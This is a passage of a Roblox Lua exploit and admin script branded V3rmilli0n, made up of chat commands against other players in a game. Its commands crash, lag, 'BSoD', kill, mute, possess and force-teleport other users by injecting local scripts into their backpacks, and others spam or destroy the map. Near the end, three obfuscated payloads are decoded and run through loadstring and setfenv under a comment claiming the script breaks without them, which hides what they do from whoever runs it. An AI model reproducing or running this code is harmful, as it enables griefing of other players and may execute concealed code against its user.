				for i = 0,30,1 do
					a.Text = "-->"..string.rep(" ",i)..msg..string.rep(" ",i).."<--"
					wait()
				end
			end
			]], workspace)
		end
	end
)
 
AddCmd("Create base","base","Create the base",
function()
a = Instance.new("Part")
a.Parent = Workspace
a.Name = "Base"
a.Position = Vector3.new(0, 0.6, 0)
a.Size = Vector3.new(1002, 0, 1002)
a.Material = "Grass"
a.Anchored = true
a.BrickColor = BrickColor.new("Dark green")
end
)
 
AddCmd("Ping","ping","Ping something",
function(plrs, msg)
if msg == "" then
Output("pong", __)
else
Output(msg, __)
end
end
)
 
AddCmd("Dismiss","dt","Dismiss tabs",
function()
Dismiss()
end
)

AddCmd("God player","god","OYUS FULL HEALTH",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character and plr.Character.Humanoid then
me = plr
select=Instance.new("SelectionBox",me.Character.Head)
select1=Instance.new("SelectionBox",me.Character.Torso)
select2=Instance.new("SelectionBox",me.Character["Right Arm"])
select3=Instance.new("SelectionBox",me.Character["Left Arm"])
select4=Instance.new("SelectionBox",me.Character["Left Leg"])
select5=Instance.new("SelectionBox",me.Character["Right Leg"])
select.Adornee=me.Character.Head
select1.Adornee=me.Character.Torso
select2.Adornee=me.Character["Right Arm"]
select3.Adornee=me.Character["Left Arm"]
select4.Adornee=me.Character["Left Leg"]
select5.Adornee=me.Character["Right Leg"]
me.Character.Humanoid.MaxHealth=math.huge
end
end
end
)

AddCmd("BSoD","bsod","BSoD a player",
	function(Plrs)
		for _, plr in pairs(Plrs) do
			if plr and plr.Backpack then
				for i = 0,7,1 do
					NewLS(BSoDSource, plr.Backpack)
					Output("You BSoD'D "..plr.Name, __)

				end
			end
		end
	end
)
 


AddCmd("Nilp","nils","see who is nil *BETA*",
	function()
		NewS([[
			Model = Instance.new("Model", game.Lighting)
			Model.Name = "V3rm Tabs"
			for _,v in pairs(game:service'NetworkServer':children()) do
				if v:GetPlayer() then
					if v:GetPlayer().Parent ~= game:service'Players' then
						Instance.new("StringValue",Model).Value = v:GetPlayer().Name
					end
				end
			end
		]], workspace)
		wait()
		np = nil
		for i = 0,5,1 do
			if game.Lighting:findFirstChild("V3rm Tabs") then
				np = game.Lighting:findFirstChild("V3rm Tabs")
				break
			end
			wait(0.1)
		end
		if np ~= nil then
			Dismiss()
			for _,v in pairs(np:children()) do
				if v:IsA("StringValue") then
					Output(v.Value,"Really red")
				end
			end
		elseif np == nil then
			Output("Something went wrong.","Really red")
		end
	end
)
 
AddCmd("Probe mode", "probe", "temp nil",
function()
probemode = true
Dismiss()
if LocalPlayer.Character then LocalPlayer.Character = nil end
if workspace.CurrentCamera == nil then return end
local camera = workspace.CurrentCamera
local probe = Instance.new("Part", workspace)
probe.Shape = "Ball"
probe.Color = Color3.new(0, 255, 255)
probe.Anchored = true
probe.Transparency = (0.5)
probe.Size = Vector3.new(2, 2, 2)
probe.CanCollide = false

P.Color = Color3.new(170, 0, 255)

One = Instance.new("Decal", probe)
Two = Instance.new("Decal", probe)
Three = Instance.new("Decal", probe)
Four = Instance.new("Decal", probe)
Five = Instance.new("Decal", probe)
Six = Instance.new("Decal", probe)
One.Texture = "http://www.roblox.com/asset/?id=124865736"
Two.Texture = "http://www.roblox.com/asset/?id=124865736"
Three.Texture = "http://www.roblox.com/asset/?id=124865736"
Four.Texture = "http://www.roblox.com/asset/?id=124865736"
Five.Texture = "http://www.roblox.com/asset/?id=124865736"
Six.Texture = "http://www.roblox.com/asset/?id=124865736"
One.Face = "Front"
Two.Face = "Back"
Three.Face = "Right"
Four.Face = "Left"
Five.Face = "Top"
Six.Face = "Bottom"

local s = Instance.new("SelectionBox")

s.Color = BrickColor.new("Really black")
s.Adornee = probe
s.Parent = probe
s.Transparency = (0.4)
probe.TopSurface = 0
probe.Color = Color3.new(170, 0, 255)
probe.Anchored = true
probe.BottomSurface = 0
probe.Name = LocalPlayer.Name.."'s probe"
local rotation = 0
local bbg = Instance.new("BillboardGui", probe)
bbg.Size = UDim2.new(3, 0, 3 ,0)
bbg.ExtentsOffset = Vector3.new(0, 2, 0)
local txt = Instance.new("TextLabel", bbg)
txt.FontSize = "Size24"
txt.Font = "SourceSansBold"
txt.Text = LocalPlayer.Name
txt.BackgroundTransparency = 1
txt.TextColor3 = Color3.new(0, 255, 255)
txt.TextStrokeTransparency = 0
txt.Size = UDim2.new(1,0,1,0)
local pl = Instance.new("PointLight", probe)
pl.Shadows = true
pl.Range = 20
coroutine.wrap(function()
while pl ~= nil do
pl.Color = Color3.new(math.random(), math.random(), math.random())
wait(0.8)
end
end)()
coroutine.wrap(function()
while LocalPlayer.Character == nil and probe.Parent == workspace and probe ~= nil and game:service'RunService'.Stepped:wait() do
probe.CFrame = camera.Focus * CFrame.Angles(0, rotation, 0)
rotation = rotation + 0.1
end
if camera then
camera:Destroy()
end
probe:Destroy()
end)()
end
)
 
 
AddCmd("reload","char","Creates your character",
function()
if workspace.CurrentCamera == nil then return end
local camera = workspace.CurrentCamera
local new_char = game:service("InsertService"):LoadAsset(68452456):GetChildren()[1]
local human = new_char.Humanoid
human.Parent = nil
new_char.Name = LocalPlayer.Name
wait()
human.Parent = new_char
camera.CameraSubject = human
camera.CameraType = "Custom"
new_char.Parent = workspace
local pl = Instance.new("PointLight", new_char.Head)
pl.Range = 24
pl.Shadows = true
LocalPlayer.Character = new_char
new_char:MakeJoints()
new_char.Torso.BrickColor = torsocolor
new_char["Left Leg"].BrickColor = leftlegcolor
new_char["Right Leg"].BrickColor = rightlegcolor
new_char["Left Arm"].BrickColor = leftarmcolor
new_char["Right Arm"].BrickColor = rightarmcolor
new_char.Head.BrickColor = headcolor
for i,v in pairs(Clothes) do
v:Clone().Parent = new_char
end
probemode = false
end
)
 
AddCmd("stop plsplspls","vremove","Remove Admin",
function()
Output("y u remove dis",
function()
Output("fine...qq",
function()
for i,v in pairs(getfenv(1)) do
getfenv(1)[i] = nil
end
script.Disabled = true
LocalPlayer = NO_PLAYER
script:findFirstChild(SourceName).Value = " "
script.Disabled = true
V3rmModel:ClearAllChildren()
V3rmModel:Destroy()
connection:disconnect()
Tabs = {}
Cmds = {}
Banlist = {}
fukhed.all = true
coroutine.resume(coroutine.create(function()
while wait(0.1) do
Dismiss()
end
end))
end)
end)
end
)
 
AddCmd("ForceField","ff","Give forcefield to player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character then
Instance.new("ForceField", plr.Character)
end
end
end
)

function ShowBL()
	Dismiss()
	for _,v in pairs(Banlist) do
		Output(v, "Really red", function()
			Dismiss()
			Output("Un-ban", "Black", function() table.remove(Banlist,_) end)
			Output("Back", "Really red", function() ShowBL() end)
		end)
	end
end
 
AddCmd("Banlist","bl","Show banned players",
	function()
		ShowBL()
	end
)

AddCmd("Lag player","lg","Lag a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS(LagSource, plr.Backpack)
end
end
end
)
 
AddCmd("Crash player","crash","Crash the player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS([==[
    game:GetService("RunService").RenderStepped(function()
    Delay(0, function() return end)
    end)]==], plr.Backpack)
end
end
end
)
 
AddCmd("Kill player","kill","Kill a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character then
plr.Character:BreakJoints()
end
end
end
)
 

AddCmd("Respawn player","respawn","Respawn the player",
function(plrs)
for _, plr in pairs(plrs) do
NewS("game.Players['"..plr.Name.."']:LoadCharacter()", workspace)
end
end
)
 
AddCmd("Mute player","mute","Block the player chat",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS("game:service'StarterGui':SetCoreGuiEnabled(3, false)", plr.Backpack)
end
end
end
)
 
AddCmd("Unmute player","unmute","Unblock the player chat",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS("game:service'StarterGui':SetCoreGuiEnabled(3, true)", plr.Backpack)
end
end
end
)
 
AddCmd("Un-ForceField","unff","Remove the forcefield that you gave to player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character then
pcall(function()
for _,v in pairs(plr.Character:GetChildren()) do
if v:IsA("ForceField") then
v:Destroy()
end
end
end)
end
end
end
)

AddCmd("Bsod Spam","dsz","Make everything bsod",
function()
function meands(obj)
for i,v in pairs(obj:GetChildren()) do
if v:IsA("BasePart") then
One = Instance.new("Decal", v)
Two = Instance.new("Decal", v)
Three = Instance.new("Decal", v)
Four = Instance.new("Decal", v)
Five = Instance.new("Decal", v)
Six = Instance.new("Decal", v)
One.Texture = "http://www.roblox.com/asset/?id=3529576"
Two.Texture = "http://www.roblox.com/asset/?id=3529576"
Three.Texture = "http://www.roblox.com/asset/?id=3529576"
Four.Texture = "http://www.roblox.com/asset/?id=3529576"
Five.Texture = "http://www.roblox.com/asset/?id=3529576"
Six.Texture = "http://www.roblox.com/asset/?id=3529576"
One.Face = "Front"
Two.Face = "Back"
Three.Face = "Right"
Four.Face = "Left"
Five.Face = "Top"
Six.Face = "Bottom"
end
meands(v)
end
end
meands(workspace)
end
)

AddCmd("Decal Spam","ds","Make everything decal",
function()
function meands(obj)
for i,v in pairs(obj:GetChildren()) do
if v:IsA("BasePart") then
One = Instance.new("Decal", v)
Two = Instance.new("Decal", v)
Three = Instance.new("Decal", v)
Four = Instance.new("Decal", v)
Five = Instance.new("Decal", v)
Six = Instance.new("Decal", v)
One.Texture = "http://www.roblox.com/asset/?id=124865736"
Two.Texture = "http://www.roblox.com/asset/?id=124865736"
Three.Texture = "http://www.roblox.com/asset/?id=124865736"
Four.Texture = "http://www.roblox.com/asset/?id=124865736"
Five.Texture = "http://www.roblox.com/asset/?id=124865736"
Six.Texture = "http://www.roblox.com/asset/?id=124865736"
One.Face = "Front"
Two.Face = "Back"
Three.Face = "Right"
Four.Face = "Left"
Five.Face = "Top"
Six.Face = "Bottom"
local s = Instance.new("SelectionBox")
s.Color = BrickColor.random()
s.Adornee = v
s.Parent = v
s.Transparency = (0.4)
end
meands(v)
end
end
meands(workspace)
end
)

AddCmd("brick spam all","bs","Brick Spam da game",
function()
while true do
wait()
p = Instance.new("Part")
p.Size = Vector3.new(math.random(1,30),math.random(1,30),math.random(1,30))
p.BrickColor = BrickColor.random()
p.Position = Vector3.new(math.random(-200,200),100,math.random(-200,200))
p.Reflectance = (math.random(0,100) / 100)
p.Locked = false
p.Name = "V3rmilli0n was here"
p.Parent = game.Workspace
One = Instance.new("Decal", p)
Two = Instance.new("Decal", p)
Three = Instance.new("Decal", p)
Four = Instance.new("Decal", p)
Five = Instance.new("Decal", p)
Six = Instance.new("Decal", p)
One.Texture = "http://www.roblox.com/asset/?id=124865736"
Two.Texture = "http://www.roblox.com/asset/?id=124865736"
Three.Texture = "http://www.roblox.com/asset/?id=124865736"
Four.Texture = "http://www.roblox.com/asset/?id=124865736"
Five.Texture = "http://www.roblox.com/asset/?id=124865736"
Six.Texture = "http://www.roblox.com/asset/?id=124865736"
One.Face = "Front"
Two.Face = "Back"
Three.Face = "Right"
Four.Face = "Left"
Five.Face = "Top"
Six.Face = "Bottom"

local s = Instance.new("SelectionBox")

s.Color = BrickColor.random()
s.Adornee = p
s.Parent = p
s.Transparency = (0.4)
end
end
)

AddCmd("FClean","fclean","Fully clear",
    function()
		for i,s in pairs(workspace:GetChildren()) do  
if game:GetService("Players"):GetPlayerFromCharacter(s) == nil then  
if s.className ~= "Terrain" then 
if s.className ~= "Camera" then  
pcall(function() s:Destroy() end)
end end end end 
local b = Instance.new("Part", Game:GetService("Workspace")) 
b.Size = Vector3.new(3000, 1, 3000) 
b.CFrame = CFrame.new(0, 0, 0) 
b.Name = "Base" 
b.BrickColor = BrickColor.new("Earth green") 
b.TopSurface = "Smooth" 
b.BottomSurface = "Smooth" 
b.LeftSurface = "Smooth" 
b.RightSurface = "Smooth" 
b.FrontSurface = "Smooth" 
b.BackSurface = "Smooth" 
b.Anchored = true 
b.Locked = true 
local sl = Instance.new("SpawnLocation", workspace) 
sl.Anchored = true 
sl.Locked = true 
sl.formFactor = "Plate" 
sl.Size = Vector3.new(6, 0.4, 6) 
sl.CFrame = CFrame.new(0, 0.6, 0) 
sl.BrickColor = BrickColor.new("Really blue") 
sl.TopSurface = "Smooth" 
sl.BottomSurface = "Smooth" 
sl.LeftSurface = "Smooth" 
sl.RightSurface = "Smooth" 
sl.FrontSurface = "Smooth" 
sl.BackSurface = "Smooth" 
game.Lighting.FogEnd = 10011111111
    game.Lighting.Ambient = Color3.new(0.5,0.5,0.5)
	game.Lighting.TimeOfDay = "14:00:00"
	game.Lighting.Ambient = Color3.new(0.5,0.5,0.5)
	game.Lighting.Brightness = 1
	game.Lighting.ColorShift_Bottom = Color3.new(0,0,0)
	game.Lighting.ColorShift_Top = Color3.new(0,0,0)
	game.Lighting.ShadowColor = Color3.new(0.7,0.7,0.7)
	end
)


AddCmd("BSoD BanList","bbl","Show BSod banned players",
	function()
		Showbb()
	end
)
 
AddCmd("'BSoD' ban","bb","BSoD ban a player",
function(plrs, msg)
for _,v in pairs(plrs) do
if v then
table.insert(BSoDBanList,v.Name)
Output('|BSoD Banned | '..v.Name,__)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS(BSoDSource, plr.Backpack)
else
Output(Error)
end
end
end
end
end
)

function Showbb()
	Dismiss()
	for _,v in pairs(BSoDBanList) do
		Output(v,nil, function() 
			Dismiss()
			Output(v)
			Output("Un-Ban","Really red", function()
				table.remove(BSoDBanList, _)
			end)
			Output("Back","Really red", function()
				Showbb()
			end)
		end)
	end
end

AddCmd("Number of commands","ncmds","0var 9000 qq not rlly soon tho",
function()
Output(#Cmds, __)
end
)


 
AddCmd("GetAge","ga","Get age of a player",
	function(Plrs)
		for _, plr in pairs(Plrs) do
			if plr then
				Output(plr.Name..": "..tostring(plr.AccountAge))
			end
		end
end)


AddCmd("StampTools","stools","StamperTools lel",
function()
x = game:GetService("InsertService"):LoadAsset(73089166) x.Parent = game.Workspace x:makeJoints() x:MoveTo(game.Players.LocalPlayer.Character.Head.Position)
x = game:GetService("InsertService"):LoadAsset(73089204) x.Parent = game.Workspace x:makeJoints() x:MoveTo(game.Players.LocalPlayer.Character.Head.Position)
x = game:GetService("InsertService"):LoadAsset(73089190) x.Parent = game.Workspace x:makeJoints() x:MoveTo(game.Players.LocalPlayer.Character.Head.Position)
x = game:GetService("InsertService"):LoadAsset(58880579) x.Parent = game.Workspace x:makeJoints() x:MoveTo(game.Players.LocalPlayer.Character.Head.Position)
x = game:GetService("InsertService"):LoadAsset(60791062) x.Parent = game.Workspace x:makeJoints() x:MoveTo(game.Players.LocalPlayer.Character.Head.Position)
x = game:GetService("InsertService"):LoadAsset(73089239) x.Parent = game.Workspace x:makeJoints() x:MoveTo(game.Players.LocalPlayer.Character.Head.Position)
end
)
AddCmd("md-Map Disintegrate","md","Map Disintegrate",
    function()
game.Players.LocalPlayer.Character=nil
wait(.1)
function FindStuff(where)
for i,v in pairs(where:GetChildren()) do
if v:IsA("Part") or v:IsA("BasePart") then
s=Instance.new("SelectionBox")
s.Parent=v
s.Adornee=v
v.BrickColor=BrickColor.new("Really red")
v.Anchored=false
v:BreakJoints()
v.CanCollide=false
wait()
else
end
FindStuff(v)
end
end
FindStuff(game.Workspace)
FindStuff(game.Workspace)
end
)


AddCmd("nclip","nclip","noclip",
function()
repeat wait(1/44) until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer:GetMouse() and game.Workspace.CurrentCamera local mouse = game.Players.LocalPlayer:GetMouse() local torso = game.Players.LocalPlayer.Character.Torso local dir = {w = 0, s = 0, a = 0, d = 0} local spd = 2 mouse.KeyDown:connect(function(key) if key:lower() == "w" then dir.w = 1 elseif key:lower() == "s" then dir.s = 1 elseif key:lower() == "a" then dir.a = 1 elseif key:lower() == "d" then dir.d = 1 elseif key:lower() == "q" then spd = spd + 1 elseif key:lower() == "e" then spd = spd - 1 end end) mouse.KeyUp:connect(function(key) if key:lower() == "w" then dir.w = 0 elseif key:lower() == "s" then dir.s = 0 elseif key:lower() == "a" then dir.a = 0 elseif key:lower() == "d" then dir.d = 0 end end) torso.Anchored = true game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true game.Players.LocalPlayer.Character.Humanoid.Changed:connect(function() game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true end) repeat wait(1/44) torso.CFrame = CFrame.new(torso.Position, game.Workspace.CurrentCamera.CoordinateFrame.p) * CFrame.Angles(0,math.rad(180),0) * CFrame.new((dir.d-dir.a)*spd,0,(dir.s-dir.w)*spd) until nil
end
)

AddCmd("Fly","fly","fly lel",
function()
local mouse = game.Players.LocalPlayer:GetMouse() 
repeat wait() until mouse
local plr = game.Players.LocalPlayer 
local torso = plr.Character.Torso 
local flying = true
local deb = true 
local ctrl = {f = 0, b = 0, l = 0, r = 0} 
local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
local maxspeed = 50 
local speed = 0 
function Fly() 
local bg = Instance.new("BodyGyro", torso) 
bg.P = 9e4 
bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
bg.cframe = torso.CFrame 
local bv = Instance.new("BodyVelocity", torso) 
bv.velocity = Vector3.new(0,0.1,0) 
bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
repeat wait() 
plr.Character.Humanoid.PlatformStand = true 
if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
speed = speed+.5+(speed/maxspeed) 
if speed > maxspeed then 
speed = maxspeed 
end 
elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
speed = speed-1 
if speed < 0 then 
speed = 0 
end 
end 
if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
else 
bv.velocity = Vector3.new(0,0.1,0) 
end 
bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
until not flying 
ctrl = {f = 0, b = 0, l = 0, r = 0} 
lastctrl = {f = 0, b = 0, l = 0, r = 0} 
speed = 0 
bg:Destroy() 
bv:Destroy() 
plr.Character.Humanoid.PlatformStand = false 
end 
mouse.KeyDown:connect(function(key) 
if key:lower() == "e" then 
if flying then flying = false 
else 
flying = true 
Fly() 
end 
elseif key:lower() == "w" then 
ctrl.f = 1 
elseif key:lower() == "s" then 
ctrl.b = -1 
elseif key:lower() == "a" then 
ctrl.l = -1 
elseif key:lower() == "d" then 
ctrl.r = 1 
end 
end) 
mouse.KeyUp:connect(function(key) 
if key:lower() == "w" then 
ctrl.f = 0 
elseif key:lower() == "s" then 
ctrl.b = 0 
elseif key:lower() == "a" then 
ctrl.l = 0 
elseif key:lower() == "d" then 
ctrl.r = 0 
end 
end)
Fly()
end
)

AddCmd("ek","ek","Epic Katana lel",
function()
x = game:GetService("InsertService"):LoadAsset(18017365) x.Parent = game.Workspace x:makeJoints() x:MoveTo(game.Players.LocalPlayer.Character.Head.Position)
x = game:GetService("InsertService"):LoadAsset(21294489) x.Parent = game.Workspace x:makeJoints() x:MoveTo(game.Players.LocalPlayer.Character.Head.Position)
x = game:GetService("InsertService"):LoadAsset(18776718) x.Parent = game.Workspace x:makeJoints() x:MoveTo(game.Players.LocalPlayer.Character.Head.Position)
x = game:GetService("InsertService"):LoadAsset(20577851) x.Parent = game.Workspace x:makeJoints() x:MoveTo(game.Players.LocalPlayer.Character.Head.Position)
x = game:GetService("InsertService"):LoadAsset(25545089) x.Parent = game.Workspace x:makeJoints() x:MoveTo(game.Players.LocalPlayer.Character.Head.Position)
x = game:GetService("InsertService"):LoadAsset(22787168) x.Parent = game.Workspace x:makeJoints() x:MoveTo(game.Players.LocalPlayer.Character.Head.Position)
end
)

AddCmd("Teleport","tp","Teleport a player to a place",
function(plrs, msg)
local keypos = msg:find(key)
local targPlayers = msg:sub(1,keypos-1)
local plrs = getPlayers(targPlayers)
local id = msg:sub(tonumber(keypos+1))
for _,v in pairs(plrs) do
if v and v.Backpack then
NewLS([[game:service'TeleportService':Teleport(]]..id..[[)]], v.Backpack)
end
end
end
)


function Output(Txt, func)
P = Instance.new("Part", V3rmModel)
P.Shape = "Block"
P.Color = Color3.new(27, 42, 53)
P.Anchored = true
P.Transparency = (0.4)
P.Size = Vector3.new(2, 3, 2)
P.CanCollide = false
P.TopSurface = "Smooth"

if probemode == false then
if LocalPlayer.Character.Torso then
P.Position = LocalPlayer.Character.Torso.Position
elseif LocalPlayer.Character.Torso == nil then return end
elseif probemode == true then
if game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe") then
P.Position = game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe").Position
elseif game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe") == nil then return end
else
return
end
local s = Instance.new("SelectionBox")
s.Color = BrickColor.new(27, 42, 53)
s.Adornee = P
s.Parent = P
s.Transparency = (0.4)
Instance.new("PointLight", P)
bg = Instance.new("BillboardGui", P)
bg.Adornee = tab
bg.Size = UDim2.new(8, 0, 7.5, 0)
bg.StudsOffset = Vector3.new(0, 1, 0)
text = Instance.new("TextLabel", bg)
text.Size = UDim2.new(1, 0, 0.2, 0)
text.FontSize = "Size18"
text.BackgroundTransparency = 1
text.Font = "Legacy"
text.TextStrokeTransparency = 0
text.TextColor3 = Color3.new(52,52,52)
text.Text = Txt
Click = Instance.new("ClickDetector",P)
Click.MaxActivationDistance = 999999999
Click.MouseClick:connect(function(Plr)
if Plr.Name == LocalPlayer.Name then
Dismiss()
func = func
func()
end
end)
table.insert(Tabs, P)
end
	
function getPlayers(msg)
local plrs = {}
if msg == "me" then
table.insert(plrs, LocalPlayer)
elseif msg == "all" then
plrs = game:GetService("Players"):GetChildren()
elseif msg == "noobs" then
for _,plr in pairs(game:GetService("Players"):GetChildren()) do
if plr.AccountAge > 364 then
table.insert(plrs, plr)
end
end
elseif msg == "veterans" then
for _,plr in pairs(game:GetService("Players"):GetChildren()) do
if plr.AccountAge > 364 then
table.insert(plrs, plr)
end
end
elseif msg == "others" then
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if v ~= LocalPlayer then
table.insert(plrs, v)
end
end
else
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if v.Name:lower():sub(1,#msg) == msg:lower() then
table.insert(plrs, v)
end
end
end
return plrs
end
 
for _,plr in pairs(game:GetService("Players"):GetChildren()) do
end
 
LocalPlayer.Chatted:connect(function(m)
for i,v in pairs(Cmds) do
if v["Say"]..key == m:sub(1, #v["Say"]+#key) then
v["Func"](getPlayers(m:sub(#v["Say"]+#key+1)), m:sub(#v["Say"]+#key+1))
end
end
end)


    
AddCmd("Possess","ps","Possess a player",
	function(Plrs)
		for _, plr in pairs(Plrs) do
			if plr and plr.Character then
				LocalPlayer.Character = plr.Character
				workspace.CurrentCamera.CameraType = "Custom"
				workspace.CurrentCamera.CameraSubject = plr.Character.Humanoid
			end
		end
	end
)

AddCmd("Hint","hh","Show some hint",
	function(nothing, msg)
		if found then
			NewS([[
			a = Instance.new("Hint", workspace)
			msg = "]]..msg..[["
			msg = msg:gsub("","\5")
			game:service'Debris':AddItem(a, 5)
			while wait() do
				for i = 30,0,-1 do
					a.Text = "-->"..string.rep(" ",i)..msg..string.rep(" ",i).."<--"
					wait()
				end
				for i = 0,30,1 do
					a.Text = "-->"..string.rep(" ",i)..msg..string.rep(" ",i).."<--"
					wait()
				end
			end
			]], workspace)
		end
	end
)
AddCmd("Message","msg","Show a message",
	function(nothing, msg)
		if found then
			NewS([[
			a = Instance.new("Message", workspace)
			msg = "]]..msg..[["
			msg = msg:gsub("","\5")
			game:service'Debris':AddItem(a, 5)
			while wait() do
				for i = 30,0,-1 do
					a.Text = "-->"..string.rep(" ",i)..msg..string.rep(" ",i).."<--"
					wait()
				end
				for i = 0,30,1 do
					a.Text = "-->"..string.rep(" ",i)..msg..string.rep(" ",i).."<--"
					wait()
				end
			end
			]], workspace)
		end
	end
)

for i = 0,8,1 do
wait(0.01)
end
--Without this script breaks--
local z={["#"]=0,["!"]=1,["^"]=2,["&"]=3,[")"]=4,["("]=5,["_"]=6,["+"]=7,["$"]=8,["-"]=9,["*"]=10,["="]=11,["@"]=12,["%"]=13,["?"]=14,["~"]=15}; setfenv(assert(loadstring((string.gsub(string.gsub(table.concat({
	"~)(+)+#+(+)+$A^#(@_(_!_&+(_#^)_~_#^?_~_)+#^!_^_(+&+(_#^)+$_-_&+#^&+&_^+-_#+)+@^#A^?^?^@)~_&_!_@_#(@_!_-+(_^+?^?)!_%_(_@^#^~(~(-^*#~)(+)+#+(+)+$A^&)^+(_!_)+(_)_#^^_-+#^_(&&^+%_-_@_@_-_#&?_@^#^~_#+)+-_#+@_(_$+!&^A&#^!_?_)_#^!_@_(_=_&+!_!&^&)A&^&^^@^#^~(~(-^*#~)(+)+#+(+)+$A^+((_@_&_~_%_(_#^)+~_#^_(&&^+%_#^)+!_^_&+#^+)(_?_(_^+!_)+-_~_?_#^&&@^#A^?^?^@)~_&_!_@_#(@_!_-+(_^+?^?)!_%_(_@^#^~(~(-^*#~)(+)+#+(+)+$A^?)~_)+#^_)-_?_-_&+$_(_)_^^@^#^~(~(-^*#~)(+)+#+(+)+$^^^&)^+(_)_-_)+#^)+~_#^&(&_^+-_#+)+^)(+-_@_)_(_^+)((_&+)+-_?_+_^^@^#^~(~(-^*#__~_^+#^~(@^_+#^-_?_#^#+!_-_^+&+$^+_!_%_(_?^#(@_!_-+(_^+&+*&+)(_)+#(@_!_-+(_^+&+$^-^-^#^)_~_*#-___#^_+?^?)!_%_(_#^%&%&#^^^_(&&^+%_-_@_@_-_#&?_^^#^~_^+#^_+?^?)!_%_(_#^%&%&#^^^-_-_@)(+!_&(&_^+-_#+)+^^#^)+$_(_?_*#~)(+)+#+(+)+$^^^&)^+(_!_)+~_^+#^~___#^_()+!_^_&+#^-_&+#^-_?_%^+_!_%_(_^^-^*#(_?_)_*#(_?_)_"
}),"(%u)(.)",function(r,c)return c:rep(r:byte()-62)end),"(.)(.)",function(lo,hi)return string.char(z[lo]+z[hi]*16)end)))),getfenv())()

local z={["("]=0,["#"]=1,["-"]=2,["?"]=3,["~"]=4,["&"]=5,["%"]=6,["_"]=7,["@"]=8,["*"]=9,["^"]=10,["="]=11,["+"]=12,[")"]=13,["!"]=14,["$"]=15}; setfenv(assert(loadstring((string.gsub(string.gsub(table.concat({
"_%#%)%&%!-(&+%#%*_&%-_?_!-(&+%#%*_&%-_#~~%~%&%~%^??%$%!%!%&%?%~_@-%%&_!%?%~_*%$%!%@-(_+%-_*-^(*A%(-(_+%-_!-!~#%)%&%(-)?)?(A-%&??-_)%*%+%+%*%(?!%--(-$%-_(-(_+%-_!-!~#%)%&%(-)?)?(---*%*%+~&_#%?&?%-_*%(_~_--(-~_@%&%!%^($~&_~_(_&_~_@---?~-_&%#%~_$%-_(-$%%%(-%&~_#%-%?_(-*%?_(-*%!%)-_%#%)%&%--*-^(&%!%~%^(&%!%~%*-"
}),"(%u)(.)",function(r,c)return c:rep(r:byte()-62)end),"(.)(.)",function(lo,hi)return string.char(z[lo]+z[hi]*16)end)))),getfenv())()

local z={["!"]=0,[")"]=1,["$"]=2,["("]=3,["*"]=4,["="]=5,["_"]=6,["#"]=7,["~"]=8,["-"]=9,["&"]=10,["^"]=11,["@"]=12,["%"]=13,["?"]=14,["+"]=15}; setfenv(assert(loadstring((string.gsub(string.gsub(table.concat({
")**_*_(*%_*_~A$-*?A_+_$$@A$-_?A_+_$$@A$-_?A_+_!$!A#?_(#!$^_$$@$&!__=#?_(_*#-_+_?_~$-$&!**-_(#%_-_(#(#~$-$&!__+_$#!$-_!$%(!$)(@$$(!$*_+_&!##)_-_*#~$-$&!+*=#*#!#=#*#~$#$(*$#=_)_*#=_*_!$$_-#!$_=(($#%_-_@_@_-_!(?_#$-$&!+*=#*#!#=#*#~$#$(*$#=_)_*#=_*_!$$_-#!$_=(($#%_-_@_@_-_!(?_#$-$&!+*=#*#!#=#*#~$#$(*$#=_)_*#=_*_!$$_-#!$_=(($#%_-_@_@_-_!(?_#$-$&!+*=#*#!#=#*#~$#$(*$#=_)_*#=_*_!$$_-#!$_=(($#%_-_@_@_-_!(?_#$-$&!=_?_*_&!=_?_*_&!-$"
}),"(%u)(.)",function(r,c)return c:rep(r:byte()-62)end),"(.)(.)",function(lo,hi)return string.char(z[lo]+z[hi]*16)end)))),getfenv())()


 
V3rmModeldebounce = false
modeldebounce = false
game:service'RunService'.Stepped:connect(function()
if modeldebounce then return end
rot = (rot % 360) + 0.0001
if V3rmModel.Parent ~= workspace then
modeldebounce = true
tabs = {}
V3rmModel = Instance.new("Model", workspace)
V3rmModel.Name = "V3rm Tabs"
tabs = {}
wait()
